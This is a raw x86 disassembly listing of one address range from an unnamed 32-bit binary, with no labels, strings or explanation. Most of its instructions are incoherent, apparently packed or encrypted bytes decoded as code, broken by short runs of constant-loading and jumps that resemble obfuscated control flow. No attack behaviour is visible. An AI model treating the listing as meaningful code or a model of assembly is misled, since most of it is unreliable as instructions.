  4195f3:	cmp    al,BYTE PTR [eax+0x34a41717]
  4195f9:	fdecstp 
  4195fb:	jb     0x41959c
  4195fd:	add    BYTE PTR ds:0x54ce4e9f,cl
  419603:	(bad)  
  419604:	push   cs
  419605:	xchg   ebx,eax
  419606:	pop    es
  419607:	pushf  
  419608:	xchg   ecx,eax
  419609:	iret   
  41960a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41960b:	arpl   WORD PTR [ebx+0x1e],ax
  41960e:	sub    cl,BYTE PTR [edx]
  419610:	cld    
  419611:	and    eax,0xc992d9f
  419616:	mov    ah,0x47
  419618:	sbb    eax,0x7be163f5
  41961d:	jb     0x419683
  41961f:	lods   eax,DWORD PTR ds:[esi]
  419620:	cmp    ecx,DWORD PTR [ebp-0x79]
  419623:	cmp    DWORD PTR [edx+edx*8-0x4379e2fe],edx
  41962a:	fstp   DWORD PTR [esi-0x5]
  41962d:	push   esi
  41962e:	jp     0x419681
  419630:	or     ecx,DWORD PTR [ecx]
  419632:	adc    DWORD PTR [esi+eax*4+0x25],0xffffffc9
  419637:	or     ah,dl
  419639:	loope  0x4195c8
  41963b:	jle    0x419675
  41963d:	repz add dh,BYTE PTR [edi+0x7ea7a10a]
  419644:	lds    edi,FWORD PTR [eax]
  419646:	icebp  
  419647:	xchg   edi,eax
  419648:	adc    eax,DWORD PTR [eax+eax*8-0x40]
  41964c:	xor    eax,0x4986d37d
  419651:	xchg   esi,eax
  419652:	sub    dl,BYTE PTR [eax+0x44]
  419655:	sub    BYTE PTR [esi+0xb],ah
  419658:	retf   0xa4ba
  41965b:	and    DWORD PTR [eax],eax
  41965d:	add    BYTE PTR [esi+0xb],ah
  419660:	retf   0x8b66
  419663:	push   esp
  419664:	and    al,0x2c
  419666:	sub    cx,dx
  419669:	mov    dx,WORD PTR [esp+0x38]
  41966e:	sub    cx,dx
  419671:	mov    dx,WORD PTR [esp+0x3c]
  419676:	cmp    dx,cx
  419679:	jbe    0x41a320
  41967f:	mov    ecx,0x5008
  419684:	jmp    0x4198e1
  419689:	xchg   ebx,eax
  41968a:	sub    al,0x3f
  41968c:	jae    0x419706
  41968e:	mov    esp,0x77bf2cb3
  419693:	jo     0x419672
  419695:	jae    0x4196a7
  419697:	ror    edi,0xab
  41969a:	or     eax,eax
  41969c:	mov    esi,0xbebec235
  4196a1:	ds xor esi,edx
  4196a4:	ret    
  4196a5:	push   ecx
  4196a6:	imul   edi,DWORD PTR [eax],0xe
  4196a9:	dec    esp
  4196aa:	out    0x71,al
  4196ac:	add    edi,DWORD PTR [eax-0x1caf8f50]
  4196b2:	in     eax,dx
  4196b3:	out    0x36,al
  4196b5:	mov    tr4,esp
  4196b8:	bound  esi,QWORD PTR [eax-0x2e95d3]
  4196be:	push   ebx
  4196bf:	sub    DWORD PTR [eax+ebp*2],ebx
  4196c2:	(bad)  
  4196c3:	dec    esi
  4196c4:	push   ebp
  4196c5:	inc    edx
  4196c6:	addr16 sahf 
  4196c8:	dec    eax
  4196c9:	popa   
  4196ca:	mov    BYTE PTR [edi+0xf],ah
  4196cd:	or     al,0x6a
  4196cf:	adc    edx,eax
  4196d1:	mov    al,ds:0x3aee1472
  4196d6:	inc    eax
  4196d7:	sub    bh,al
  4196d9:	push   edi
  4196da:	mov    bh,0x13
  4196dc:	push   ds
  4196dd:	call   0xd3b4f6ec
  4196e2:	mov    edx,0x6c0e6e9
  4196e7:	dec    DWORD PTR [edx]
  4196e9:	sub    ch,BYTE PTR ds:0x5fb75ade
  4196ef:	fiadd  WORD PTR [ecx+edi*8]
  4196f2:	pop    ecx
  4196f3:	sbb    cl,dl
  4196f5:	dec    ecx
  4196f6:	call   0x9494:0x6cae1bba
  4196fd:	cmp    eax,0xab0c1ee1
  419702:	dec    ebx
  419703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419704:	outs   dx,DWORD PTR ds:[esi]
  419705:	cmp    BYTE PTR [edx+ebx*8],bh
  419708:	jp     0x4196c7
  41970a:	call   esi
  41970c:	or     al,0x2f
  41970e:	sub    esp,DWORD PTR [edi-0x41]
  419711:	adc    cl,ah
  419713:	(bad)  
  419715:	ror    BYTE PTR [ecx+0x2],0xa2
  419719:	ret    0x2d58
  41971c:	je     0x41972c
  41971e:	xor    edx,0x9511c810
  419724:	lods   eax,DWORD PTR ds:[esi]
  419725:	out    dx,eax
  419726:	mov    dl,0xe9
  419728:	shr    dl,0xb6
  41972b:	mov    ebx,0x69a3bb28
  419730:	cmp    bl,BYTE PTR [eax]
  419732:	retf   0xcaa5
  419735:	add    BYTE PTR ds:0xce6255fe,ch
  41973b:	aad    0x46
  41973d:	iret   
  41973e:	imul   eax,edx,0x534189b3
  419744:	(bad)  
  419745:	(bad)  
  419746:	jecxz  0x41972c
  419748:	sub    DWORD PTR ds:0xb631855a,edx
  41974e:	into   
  41974f:	and    dl,BYTE PTR [edx-0x608dbe4e]
  419755:	mov    eax,esp
  419757:	and    BYTE PTR [esi+0x4a7b9a82],ah
  41975d:	aad    0xae
  41975f:	mov    edx,0x101972d9
  419764:	ficomp WORD PTR [edx]
  419766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419767:	push   cs
  419768:	call   0x4b82ea37
  41976d:	shr    BYTE PTR [eax],cl
  41976f:	(bad)  
  419771:	lods   eax,DWORD PTR ds:[esi]
  419772:	loopne 0x419729
  419774:	(bad)  
  419775:	sub    eax,0x9ef4f457
  41977a:	push   edi
  41977b:	dec    esi
  41977c:	xor    DWORD PTR ds:0xe66145ca,esi
  419782:	dec    esp
  419783:	int3   
  419784:	imul   edi,DWORD PTR [ebp+0x4246b86a],0xffffffde
  41978b:	in     al,dx
  41978c:	pusha  
  41978d:	adc    edx,DWORD PTR [eax+0x77]
  419790:	add    DWORD PTR [ecx],ecx
  419792:	test   DWORD PTR [esp+eax*2],ecx
  419795:	mov    WORD PTR [esi-0x2b],dx
  419799:	push   ss
  41979a:	push   esp
  41979b:	push   0xffffffdb
  41979d:	mov    al,0x8d
  41979f:	gs pop edi
  4197a1:	cmp    bh,bl
  4197a3:	mov    ah,0xaa
  4197a5:	jg     0x419826
  4197a7:	add    BYTE PTR [edi+0x37],ch
  4197aa:	ret    0xbff4
  4197ad:	mov    al,ds:0xcbc90857
  4197b2:	mov    DWORD PTR [esp+edx*8],edi
  4197b5:	aaa    
  4197b6:	add    eax,0xd926ce4c
  4197bb:	ja     0x4197d5
  4197bd:	shl    BYTE PTR [esp+edx*4],0x99
  4197c1:	mov    bl,0x48
  4197c3:	ror    BYTE PTR [ebp-0x2cdc58b0],1
  4197c9:	call   0x4150:0x21c40ece
  4197d0:	pop    esp
  4197d1:	adc    al,0x57
  4197d3:	sbb    esp,0x7215d727
  4197d9:	fimul  WORD PTR [ecx]
  4197db:	jmp    0x8b8ddf7f
  4197e0:	pop    ebp
  4197e1:	add    ebp,DWORD PTR [esi-0x8]
  4197e4:	push   esp
  4197e5:	loope  0x4197db
  4197e7:	pusha  
  4197e8:	adc    BYTE PTR [ecx-0x4d7ac75a],dh
  4197ee:	or     ch,BYTE PTR [esi+0x509f5399]
  4197f4:	repz jb 0x419856
  4197f7:	dec    ebx
  4197f8:	jecxz  0x4197c1
  4197fa:	adc    BYTE PTR [edi+0x29],0x16
  4197fe:	iret   
  4197ff:	jns    0x419813
  419801:	mov    DWORD PTR [ecx+0x38],0x6d8b687a
  419808:	loop   0x419826
  41980a:	repnz sub BYTE PTR [ecx+0x76],0x64
  41980f:	das    
  419810:	mov    esp,0x43332b19
  419815:	adc    DWORD PTR [ecx-0x26],edx
  419818:	or     BYTE PTR [edi+ebp*4],ch
  41981b:	cs std 
  41981d:	ss mov eax,0x8d95601f
  419823:	aas    
  419824:	mov    edi,0x80878398
  419829:	mov    dh,0xac
  41982b:	xchg   ecx,eax
  41982c:	sti    
  41982d:	les    esp,FWORD PTR ds:0xfda387af
  419833:	sti    
  419834:	sub    BYTE PTR [ebp+0xe759105],al
  41983a:	pop    ss
  41983b:	leave  
  41983c:	cmp    BYTE PTR [edx-0x2e],bl
  41983f:	ror    BYTE PTR [esi+0x47],0x5c
  419843:	aaa    
  419844:	sub    esp,edi
  419846:	aaa    
  419847:	or     eax,0x1e4809dd
  41984c:	test   BYTE PTR [edx-0x13],bh
  41984f:	xchg   al,bl
  419851:	xlat   BYTE PTR ds:[ebx]
  419852:	imul   BYTE PTR [esi-0x3d]
  419855:	cld    
  419856:	popf   
  419857:	imul   ebx,DWORD PTR [ecx],0x363c153f
  41985d:	sbb    dh,dl
  41985f:	mov    bh,0xa2
  419861:	outs   dx,BYTE PTR ds:[esi]
  419862:	cs inc esp
  419864:	jmp    0xb8c325fa
  419869:	stc    
  41986a:	sbb    al,0xfc
  41986c:	or     esp,DWORD PTR [esi-0x4c1cf8e0]
  419872:	(bad)  
  419873:	in     eax,dx
  419874:	int3   
  419875:	sub    al,0x78
  419877:	xor    eax,0xae60ac65
  41987c:	hlt    
  41987d:	jecxz  0x419861
  41987f:	and    eax,0xd25fff7a
  419884:	sbb    DWORD PTR [eax+0x1d],0xabf8520b
  41988b:	sti    
  41988c:	cmp    ebp,DWORD PTR ds:0x27327698
  419892:	inc    edi
  419893:	cmp    al,0x7d
  419895:	cs daa 
  419897:	sti    
  419898:	fcom   st(2)
  41989a:	adc    dl,BYTE PTR ds:0x3bd86418
  4198a0:	xor    al,0x32
  4198a3:	pop    ebx
  4198a4:	or     esi,DWORD PTR [ecx]
  4198a6:	xchg   esp,eax
  4198a7:	inc    DWORD PTR [edx-0x588ea516]
  4198ad:	in     eax,dx
  4198ae:	xor    al,0x35
  4198b0:	cmp    eax,DWORD PTR [ebp+0x42]
  4198b3:	fwait
  4198b4:	icebp  
  4198b5:	sahf   
  4198b6:	sub    ebx,0xffffffc0
  4198b9:	xor    ecx,DWORD PTR [esi-0x63]
  4198bc:	pop    esi
  4198bd:	or     ebp,DWORD PTR [ebx]
  4198bf:	xor    BYTE PTR [ecx],cl
  4198c1:	bound  esp,QWORD PTR [ebp+0x2de6606]
  4198c7:	sbb    esp,DWORD PTR [ebp+0xf]
  4198ca:	add    eax,0xc44b2c63
  4198cf:	leave  
  4198d0:	ja     0x41993c
  4198d2:	lock cmp esi,DWORD PTR [esi]
  4198d5:	inc    edi
  4198d6:	pop    ebx
  4198d7:	dec    esi
  4198d8:	push   0x13e57427
  4198dd:	leave  
  4198de:	gs jmp 0x2424:0x4c896692
  4198e6:	mov    ecx,0x60ce
  4198eb:	mov    WORD PTR [esp+0xc],cx
  4198f0:	movzx  ecx,WORD PTR [esp+0xc]
  4198f5:	mov    edx,0x2095
  4198fa:	or     cx,dx
  4198fd:	mov    dx,WORD PTR [esp+0x24]
  419902:	sub    cx,dx
  419905:	jmp    0x419b62
  41990a:	loop   0x419959
  41990c:	push   eax
  41990d:	xchg   ebx,eax
  41990e:	je     0x4198a4
  419910:	and    ch,BYTE PTR [edi-0x307dfe70]
  419916:	mov    dh,0x37
  419918:	frstor ds:[ecx*1-0x3dca4140]
  419920:	mov    esi,0xca8d75be
  419925:	mov    bh,BYTE PTR [ecx-0x552df3d2]
  41992b:	lods   eax,DWORD PTR cs:[esi]
  41992d:	data16 cmp al,0x20
  419930:	rol    BYTE PTR ds:0xbb9b3a41,1
  419936:	add    eax,0xa57e62dc
  41993b:	out    0x19,al
  41993d:	mov    ebx,0x98d8642e
  419942:	imul   esi,DWORD PTR [esi],0x58
  419945:	(bad)  
  419947:	imul   ecx,DWORD PTR [esi+0x7cf38791],0xffffff9f
  41994e:	jmp    0xb2de:0xcac34019
  419955:	lahf   
  419956:	ss inc eax
  419958:	enter  0xfdb2,0x31
  41995c:	mov    bh,0x45
  41995e:	cdq    
  41995f:	ror    BYTE PTR [edi+0x53],0xca
  419963:	lds    esi,FWORD PTR [edi+ecx*8-0x78059e41]
  41996a:	rcr    DWORD PTR [ecx-0x14],1
  41996d:	stos   DWORD PTR es:[edi],eax
  41996e:	fwait
  41996f:	(bad)  
  419970:	out    dx,al
  419971:	inc    edi
  419972:	scas   al,BYTE PTR es:[edi]
  419973:	mov    bl,0x65
  419975:	test   ebp,edi
  419977:	psrlq  mm5,mm0
  41997a:	pop    es
  41997b:	push   edi
  41997c:	sar    BYTE PTR [eax],1
  41997e:	or     ch,BYTE PTR [edx]
  419980:	pop    esp
  419981:	daa    
  419982:	popa   
  419983:	outs   dx,DWORD PTR ds:[esi]
  419984:	scas   eax,DWORD PTR es:[edi]
  419985:	das    
  419986:	or     al,0x76
  419988:	sahf   
  419989:	sub    eax,0xae2a757d
  41998e:	loopne 0x419a0e
  419990:	jae    0x4199df
  419992:	pop    ds
  419993:	fimul  DWORD PTR [ebx-0x4e7e548f]
  419999:	push   cs
  41999a:	shl    bl,1
  41999c:	xchg   ebx,ebp
  41999e:	mov    cl,0xc1
  4199a0:	mov    ch,BYTE PTR [edx]
  4199a2:	ds push eax
  4199a4:	sub    ch,BYTE PTR [ecx-0xc]
  4199a7:	sahf   
  4199a8:	and    esi,esp
  4199aa:	cwde   
  4199ab:	cmp    ch,BYTE PTR [edi+0x47]
  4199ae:	mov    ss,WORD PTR [eax]
  4199b0:	dec    edi
  4199b1:	es addr16 dec esp
  4199b4:	adc    BYTE PTR [ebp+0x50bc8991],ah
  4199ba:	nop
  4199bb:	xlat   BYTE PTR ds:[ebx]
  4199bc:	or     al,0x83
  4199be:	adc    ch,bl
  4199c0:	aaa    
  4199c1:	dec    edx
  4199c2:	retf   
  4199c3:	gs loope 0x419a22
  4199c6:	(bad)  
  4199c7:	pusha  
  4199c8:	and    bl,BYTE PTR [ebx-0x660bddb2]
  4199ce:	das    
  4199cf:	jo     0x4199e1
  4199d1:	fld    DWORD PTR [edi+0x6a]
  4199d4:	pop    ecx
  4199d5:	stos   BYTE PTR es:[edi],al
  4199d6:	aam    0xf8
  4199d8:	ret    
  4199d9:	je     0x4199de
  4199db:	in     eax,0xd5
  4199dd:	jge    0x419972
  4199df:	xchg   edx,eax
  4199e0:	nop
  4199e1:	mov    ebx,0x7b9e3a86
  4199e6:	xchg   edx,eax
  4199e7:	loop   0x4199ef
  4199e9:	or     ah,BYTE PTR [esi]
  4199eb:	sbb    al,0x20
  4199ed:	shl    DWORD PTR [esi+0x4c],1
  4199f0:	into   
  4199f1:	in     eax,dx
  4199f2:	icebp  
  4199f3:	adc    al,0x3a
  4199f5:	mov    ecx,0x69cfcdf1
  4199fa:	popf   
  4199fb:	outs   dx,BYTE PTR ds:[esi]
  4199fc:	xor    al,0xd5
  4199fe:	hlt    
  4199ff:	adc    BYTE PTR ds:0xc47faa19,0x43
  419a06:	xchg   edx,eax
  419a07:	dec    DWORD PTR [edx+0x4f8098e5]
  419a0d:	sar    BYTE PTR [ebx],cl
  419a0f:	pop    edi
  419a10:	fld    DWORD PTR ds:0xee2fa034
  419a16:	sub    al,0x61
  419a18:	xor    ch,BYTE PTR [ebx]
  419a1a:	mov    ecx,0x677b2922
  419a1f:	repnz test DWORD PTR [esi],esi
  419a22:	hlt    
  419a23:	sub    dl,BYTE PTR [ebx+0x7fcd1245]
  419a29:	inc    edx
  419a2a:	mov    ds:0xa9c83633,al
  419a2f:	repz ss add al,0xac
  419a33:	add    eax,0xc47951c3
  419a38:	lahf   
  419a39:	arpl   WORD PTR [eax-0x7c],bp
  419a3c:	ret    0xa7e2
  419a3f:	outs   dx,BYTE PTR ds:[esi]
  419a40:	repz mov cs,WORD PTR [esp+edx*4+0x31]
  419a45:	ins    BYTE PTR es:[edi],dx
  419a46:	sti    
  419a47:	inc    ebx
  419a48:	mov    dh,0x77
  419a4a:	xor    al,0x7e
  419a4c:	jmp    0xc29d:0xcddf20b7
  419a53:	adc    al,0x9a
  419a55:	in     eax,dx
  419a56:	inc    esi
  419a57:	mov    BYTE PTR [esi+0x17fd05bd],al
  419a5d:	enter  0x6bdd,0xed
  419a61:	enter  0x24d,0x6f
  419a65:	aam    0x1f
  419a67:	repnz push eax
  419a69:	pop    ebx
  419a6a:	mov    ecx,0xa36e60d9
  419a6f:	mov    ch,0xb
  419a71:	adc    cl,BYTE PTR [edx]
  419a73:	jb     0x419a0b
  419a75:	pop    ecx
  419a76:	push   esp
  419a77:	aad    0x21
  419a79:	adc    edi,DWORD PTR [ecx]
  419a7b:	aad    0xa2
  419a7d:	aaa    
  419a7e:	shr    DWORD PTR [ebx],1
  419a80:	dec    ecx
  419a81:	ins    BYTE PTR es:[edi],dx
  419a82:	dec    esp
  419a83:	mov    bl,0x9d
  419a85:	sub    BYTE PTR [esi+esi*1],0xb4
  419a89:	mov    ecx,edi
  419a8b:	int    0xa2
  419a8d:	cmc    
  419a8e:	jno    0x419a9e
  419a90:	xchg   edx,esi
  419a92:	loopne 0x419ae8
  419a94:	aaa    
  419a95:	inc    ebx
  419a96:	pop    esp
  419a97:	push   cs
  419a98:	mov    BYTE PTR [edi+0x1f7f6eb3],cl
  419a9e:	popf   
  419a9f:	mov    ds:0x143cbebf,eax
  419aa4:	and    bl,BYTE PTR [ebp+eax*8+0x79855029]
  419aab:	sbb    dl,ah
  419aad:	jne    0x419a86
  419aaf:	mov    ecx,0xd817f7da
  419ab4:	sbb    al,0xdd
  419ab6:	push   ss
  419ab7:	mov    gs,dx
  419aba:	push   edi
  419abb:	int3   
  419abc:	pushf  
  419abd:	gs mov bh,0x5b
  419ac0:	into   
  419ac1:	inc    eax
  419ac2:	sti    
  419ac3:	push   ss
  419ac4:	pop    ss
  419ac5:	daa    
  419ac6:	shl    DWORD PTR [ebp+0x3],cl
  419ac9:	popa   
  419aca:	aas    
  419acb:	rcl    DWORD PTR [eax+0x3eac6d69],1
  419ad1:	cs std 
  419ad3:	mov    esp,0x8ba0e741
  419ad8:	pop    ecx
  419ad9:	mov    ?,WORD PTR [edi]
  419adb:	xchg   esi,eax
  419adc:	out    dx,al
  419add:	mov    ebx,0x2eda24df
  419ae2:	push   eax
  419ae3:	repz (bad) 
  419ae5:	ffreep st(7)
  419ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ae8:	push   esi
  419ae9:	mov    ch,0x28
  419aeb:	sbb    eax,0x9d57bd93
  419af0:	sbb    ah,BYTE PTR ds:0x9808570f
  419af6:	retf   0x971f
  419af9:	and    DWORD PTR [esi],esp
  419afb:	sub    BYTE PTR [ecx],bl
  419afd:	dec    eax
  419afe:	mov    ch,0xca
  419b00:	add    bh,BYTE PTR [edx-0x55c33e5b]
  419b06:	dec    edi
  419b07:	fmul   st,st(3)
  419b09:	inc    ebp
  419b0a:	push   cs
  419b0b:	int    0xbd
  419b0d:	ins    DWORD PTR es:[edi],dx
  419b0e:	sbb    eax,0xbd7a78f4
  419b13:	xor    esp,esp
  419b15:	imul   ebp,eax,0x427dfbc
  419b1b:	push   es
  419b1c:	(bad)  
  419b1d:	push   ecx
  419b1e:	popa   
  419b1f:	sub    cl,BYTE PTR [eax+ebp*4-0x378af104]
  419b26:	call   0xd49736d7
  419b2b:	loope  0x419b7e
  419b2d:	xchg   ecx,eax
  419b2e:	and    BYTE PTR [ecx-0x64649f0a],bl
  419b34:	jecxz  0x419aed
  419b36:	inc    edx
  419b37:	js     0x419b72
  419b39:	cs mov bh,0x25
  419b3c:	jmp    0x419afa
  419b3e:	mov    cl,0x7f
  419b40:	mov    al,ds:0x8b67f34f
  419b45:	cmp    ebp,DWORD PTR [eax+0x5a]
  419b48:	dec    ecx
  419b49:	push   0x59
  419b4b:	test   eax,0x51c8c8d4
  419b50:	fstp   TBYTE PTR [ecx+esi*1+0x56]
  419b54:	sti    
  419b55:	sub    dh,ch
  419b57:	xor    BYTE PTR [edx+0x3861f48c],dl
  419b5d:	ds mov edi,0xba7cb756
  419b63:	ficom  WORD PTR [eax]
  419b65:	add    BYTE PTR [eax],al
  419b67:	or     ecx,0x742f
  419b6d:	imul   ecx,ecx,0x30b2
  419b73:	mov    WORD PTR [esp+0x3c],cx
  419b78:	mov    ecx,0x6143
  419b7d:	mov    WORD PTR [esp+0x38],cx
  419b82:	mov    ecx,0x679f
  419b87:	mov    WORD PTR [esp+0x2c],cx
  419b8c:	mov    ecx,0x1210
  419b91:	mov    WORD PTR [esp+0x24],cx
  419b96:	mov    ecx,0x3308
  419b9b:	mov    WORD PTR [esp+0xc],cx
  419ba0:	mov    cx,WORD PTR [esp+0xc]
  419ba5:	sub    cx,dx
  419ba8:	jmp    0x419e05
  419bad:	jge    0x419b6c
  419baf:	into   
  419bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb1:	mov    ?,WORD PTR [esp+esi*4-0x51b6fd1d]
  419bb8:	iret   
  419bb9:	ret    
  419bba:	aaa    
  419bbb:	ss xchg edx,eax
  419bbd:	pushf  
  419bbe:	adc    eax,eax
  419bc0:	mov    esi,0xbebec235
  419bc5:	add    BYTE PTR [edi-0x6bb72356],cl
  419bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bcc:	xor    dh,BYTE PTR [ebx]
  419bce:	sar    DWORD PTR [ecx-0x58],1
  419bd1:	push   ebx
  419bd2:	cmp    al,0xf1
  419bd4:	mov    ebx,0xc63bf529
  419bd9:	mov    bl,0xa6
  419bdb:	add    al,0x5e
  419bdd:	push   esp
  419bde:	outs   dx,BYTE PTR ds:[esi]
  419bdf:	scas   eax,DWORD PTR es:[edi]
  419be0:	mov    dh,0x1b
  419be2:	xchg   BYTE PTR [esi+0x7650cb4c],dl
  419be8:	fcom   QWORD PTR [ebp-0xd]
  419beb:	fcmovnb st,st(1)
  419bed:	sub    al,BYTE PTR [ebp-0x7ef14ceb]
  419bf3:	ds hlt 
  419bf5:	lods   eax,DWORD PTR ds:[esi]
  419bf6:	and    al,0x67
  419bf8:	retf   
  419bf9:	fisttp QWORD PTR [esi+0x4d7a38c4]
  419bff:	add    ecx,DWORD PTR [eax+0x40701a34]
  419c05:	or     al,0x94
  419c07:	inc    edx
  419c08:	mov    ecx,DWORD PTR [edi]
  419c0a:	cmp    cl,BYTE PTR [ecx]
  419c0c:	or     BYTE PTR [esi],0xb3
  419c0f:	mov    bh,0xe2
  419c11:	push   esp
  419c12:	mov    eax,0xd6a582fd
  419c17:	inc    edx
  419c18:	lahf   
  419c19:	add    al,0xac
  419c1b:	cmp    DWORD PTR [eax+eiz*1-0x79],esi
  419c1f:	arpl   bp,dx
  419c21:	add    BYTE PTR [edi-0x44],bl
  419c24:	sbb    eax,0xc3fd38d0
  419c29:	out    0x79,eax
  419c2b:	sub    ch,BYTE PTR [edi]
  419c2d:	rol    DWORD PTR [eax-0x2a],1
  419c30:	or     eax,0x98fd892d
  419c35:	dec    edi
  419c36:	not    BYTE PTR [edx-0xf]
  419c39:	in     al,0x47
  419c3b:	adc    ah,bh
  419c3d:	or     DWORD PTR [eax],eax
  419c3f:	dec    edi
  419c40:	adc    eax,0xc75c39ed
  419c45:	es jle 0x419c4a
  419c48:	mov    cl,0x27
  419c4a:	mov    ebp,0x9e837187
  419c4f:	lahf   
  419c50:	test   BYTE PTR [ebx-0x3d],dl
  419c53:	outs   dx,DWORD PTR ds:[esi]
  419c54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c55:	test   DWORD PTR fs:[ebx-0x49287646],0x46ef4435
  419c60:	push   0xffffff9a
  419c62:	jb     0x419bf0
  419c64:	xchg   dh,bh
  419c66:	jmp    0x4f78:0x9d836437
  419c6d:	test   eax,0x850df580
  419c72:	mov    esp,0xb70531be
  419c77:	int3   
  419c78:	sar    DWORD PTR ds:0x65e50c37,0x57
  419c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c80:	dec    ecx
  419c81:	arpl   WORD PTR [edx-0x38],sp
  419c84:	rcl    edi,cl
  419c86:	ret    
  419c87:	mov    DWORD PTR [edi-0x12598b36],edx
  419c8d:	jb     0x419cb1
  419c8f:	cs xchg edi,eax
  419c91:	dec    ebx
  419c92:	inc    edx
  419c93:	test   al,0xc
  419c95:	cs fcomi st,st(5)
  419c98:	mov    ecx,0x3c976f71
  419c9d:	je     0x419c27
  419c9f:	jg     0x419d00
  419ca1:	mov    al,0xc8
  419ca3:	cwde   
  419ca4:	jp     0x419c7e
  419ca6:	and    bl,BYTE PTR [ecx]
  419ca8:	stc    
  419ca9:	xchg   BYTE PTR [edx+0x18],bl
  419cac:	(bad)  
  419cad:	les    ebx,FWORD PTR [ebp-0x76]
  419cb0:	imul   ebx,esi,0x4
  419cb3:	jnp    0x419c97
  419cb5:	loope  0x419d2a
  419cb7:	ror    BYTE PTR [ecx+edi*8],0xfd
  419cbb:	pop    esi
  419cbc:	arpl   WORD PTR [edx+0x25],bx
  419cbf:	dec    esi
  419cc0:	mov    ch,BYTE PTR [eax+edx*2-0x53]
  419cc4:	mov    ecx,DWORD PTR [eax-0x49]
  419cc7:	fmul   DWORD PTR [esi+esi*2-0x3ea759e7]
  419cce:	push   ebp
  419ccf:	adc    dl,BYTE PTR [edx-0x10]
  419cd2:	jnp    0x419d46
  419cd4:	jl     0x419c59
  419cd6:	in     eax,dx
  419cd7:	xchg   BYTE PTR [edi+eiz*8],cl
  419cda:	sub    ebp,ecx
  419cdc:	sbb    ah,bl
  419cde:	pop    ebp
  419cdf:	outs   dx,BYTE PTR ds:[esi]
  419ce0:	pop    ss
  419ce1:	pop    ss
  419ce2:	addr16 or cl,dl
  419ce5:	cli    
  419ce6:	sub    al,0x71
  419ce8:	dec    edx
  419ce9:	imul   ebx,DWORD PTR [ebx-0x67],0x2ffdf4ff
  419cf0:	loopne 0x419cb6
  419cf2:	push   edx
  419cf3:	les    ebx,FWORD PTR [edx]
  419cf5:	cs jbe 0x419cf1
  419cf8:	push   ebp
  419cf9:	mov    al,dh
  419cfb:	sbb    ch,ch
  419cfd:	mov    eax,0x72c23d29
  419d02:	cmp    ch,bl
  419d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d05:	add    DWORD PTR [ebx+0x2874b497],esi
  419d0b:	loopne 0x419cb1
  419d0d:	in     al,0xb
  419d0f:	pushf  
  419d10:	mov    cl,0x5d
  419d12:	add    al,0xdd
  419d14:	daa    
  419d15:	xchg   ebx,eax
  419d16:	js     0x419d30
  419d18:	jb     0x419d40
  419d1a:	pushf  
  419d1b:	xor    ecx,edi
  419d1d:	jbe    0x419d41
  419d1f:	imul   ebp,DWORD PTR fs:[esi+edi*1-0x355d627e],0x6b122837
  419d2b:	pop    edi
  419d2c:	scas   eax,DWORD PTR es:[edi]
  419d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d2e:	lods   al,BYTE PTR ds:[esi]
  419d2f:	cmp    ch,bh
  419d31:	mov    BYTE PTR [ecx-0xe],0xac
  419d35:	fisub  WORD PTR [edi]
  419d37:	jmp    0x3995:0x72076078
  419d3e:	sub    ch,BYTE PTR [eax-0x46]
  419d41:	mov    ebx,0xfefa8b81
  419d46:	test   eax,0xafa6facd
  419d4b:	pop    ebx
  419d4c:	adc    cl,0x7e
  419d4f:	mov    eax,ds:0xd7eee806
  419d54:	xchg   ah,al
  419d56:	jno    0x419d12
  419d58:	xor    ah,BYTE PTR [esi]
  419d5a:	mov    al,0xac
  419d5c:	mov    ebp,0x2020136d
  419d61:	pop    edi
  419d62:	sbb    al,0x1b
  419d64:	enter  0xea61,0x29
  419d68:	adc    cl,BYTE PTR [ebx-0x2e]
  419d6b:	adc    al,0x8a
  419d6d:	sahf   
  419d6e:	xor    BYTE PTR [edx],bl
  419d70:	dec    ebx
  419d71:	cmp    ah,bl
  419d73:	test   ebx,ecx
  419d75:	stos   BYTE PTR es:[edi],al
  419d76:	push   0x4b108ce
  419d7b:	push   ds
  419d7c:	mov    esp,0x377cdc8f
  419d81:	div    BYTE PTR [edx-0x65]
  419d84:	xor    bl,BYTE PTR [edx-0x1f]
  419d87:	js     0x419d51
  419d89:	or     al,BYTE PTR [ebx+0x365d2dd5]
  419d8f:	out    0xbd,eax
  419d91:	lods   eax,DWORD PTR ds:[esi]
  419d92:	mov    bl,0x48
  419d94:	daa    
  419d95:	jmp    0x8d1d:0x867ecca9
  419d9c:	in     al,dx
  419d9d:	repz lahf 
  419d9f:	pushf  
  419da0:	sbb    dl,al
  419da2:	xor    BYTE PTR [edi+0x45],al
  419da5:	jl     0x419dcc
  419da7:	shl    ebx,1
  419da9:	call   0x92a295f3
  419dae:	popa   
  419daf:	cmp    eax,0x2925c0c7
  419db4:	pushf  
  419db5:	cwde   
  419db6:	adc    bl,BYTE PTR [ebp+0x6b809ace]
  419dbc:	arpl   WORD PTR ds:0xe74ea48a,ax
  419dc2:	jae    0x419dd9
  419dc4:	lock push ecx
  419dc6:	test   DWORD PTR [edx-0x7f588125],edi
  419dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dcd:	mov    dl,bl
  419dcf:	xchg   ebx,eax
  419dd0:	ret    
  419dd1:	retf   
  419dd2:	and    eax,0x31556c83
  419dd7:	pop    ecx
  419dd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dd9:	dec    ebx
  419dda:	test   edi,0x1bd7f584
  419de0:	or     ah,BYTE PTR cs:[ebx]
  419de3:	and    BYTE PTR [ebp-0x7],ah
  419de6:	cmp    al,0x73
  419de8:	div    BYTE PTR [eax]
  419dea:	cmp    al,0xa4
  419dec:	fmulp  st(3),st
  419dee:	ins    DWORD PTR es:[edi],dx
  419def:	pop    ecx
  419df0:	or     al,0x47
  419df2:	push   DWORD PTR [edi+0x62]
  419df5:	cmc    
  419df6:	add    al,0x75
  419df8:	(bad)  
  419df9:	in     al,dx
  419dfa:	inc    esp
  419dfb:	xor    al,al
  419dfd:	lea    eax,[esi-0x1db9edbf]
  419e03:	add    al,0x9a
